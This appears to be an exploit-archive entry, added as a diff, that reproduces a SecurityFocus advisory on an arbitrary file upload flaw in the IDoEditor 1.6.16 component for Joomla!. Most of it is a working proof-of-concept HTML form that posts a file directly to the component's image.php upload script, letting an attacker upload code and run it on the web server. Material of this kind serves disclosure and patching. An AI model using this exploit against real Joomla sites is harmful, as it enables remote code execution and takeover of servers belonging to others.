@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/53973/info
+
+The IDoEditor component for Joomla! is prone to a vulnerability that lets attackers upload arbitrary files because the application fails to adequately sanitize user-supplied input.
+
+An attacker can exploit this vulnerability to upload arbitrary code and run it in the context of the web server process.
+
+IDoEditor 1.6.16 is vulnerable; other versions may also be affected. 
+
+<html>
+<body>
+<center>
+<form
+action="http://www.example.com/plugins/editors/idoeditor/themes/advanced/php/image.php"
+method="post" enctype="multipart/form-data">
+<input type="file" name="pfile">
+<input type="submit" name="Submit" value="Upload">
+</form>
+</center>
+</body>
+</html>
+
